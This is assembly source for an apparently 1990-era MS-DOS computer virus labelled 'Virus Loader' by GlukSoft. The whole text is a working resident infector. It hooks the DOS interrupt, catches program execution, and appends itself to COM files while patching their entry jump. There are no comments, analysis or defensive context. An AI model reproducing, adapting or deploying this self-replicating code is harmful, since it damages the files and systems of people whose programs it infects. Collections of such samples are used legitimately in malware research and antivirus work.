

; (C) BY RUSAKOV S03


.286
.model tiny
.radix 16
.code
	org	100
a	db	0E9
	dw	d-b
b:	mov	ah,9
	int	21
	ret
c	db	'Virus Loader (C) 1990 by GlukSoft.',0DH,0A,24
d:	pusha
	mov	di,si
	call	e
e:	pop	si
	db	83,0C6,g-e
	movsb
	movsw
	mov	ax,24
	mov	es,ax
	xor	di,di
	db	83,0EE,g-d+3
	cmp	byte ptr es:[di],60
	mov	cl,k-d
	rep	movsb
	jz	f
	mov	ds,cx
	mov	si,84
	movsw
	movsw
	mov	word ptr [si-4],h-d
	mov	[si-2],ax
	push	cs
	pop	ds
f:	push	cs
	pop	es
	popa
	jmp	si
	db	0E9
g:	mov	dx,offset c
h:	pusha
	push	ds
	xor	ah,4BH
	jnz	j
	mov	ax,3D02
	int	0B4
	jc	j
	mov	bx,ax
	push	cs
	pop	ds
	mov	ah,3F
	mov	cx,3
	mov	dx,g-d
	mov	si,dx
	int	0B4
	cmp	byte ptr [si],'M'
	jz	i
	mov	ax,4202
	xor	cx,cx
	xor	dx,dx
	int	0B4
	sub	al,3
	mov	bp,ax
	mov	cl,k-d
	sub	ax,cx
	cmp	ax,[si+1]
	jz	i
	mov	ah,40
	int	0B4
	mov	ax,4200
	xor	cx,cx
	int	0B4
	mov	ah,40
	lea	dx,[si-1]
	mov	cl,3
	mov	[si],bp
	int	0B4
i:	mov	ah,3E
	int	0B4
j:	pop	ds
	popa
	db	0EA
k:
end	a

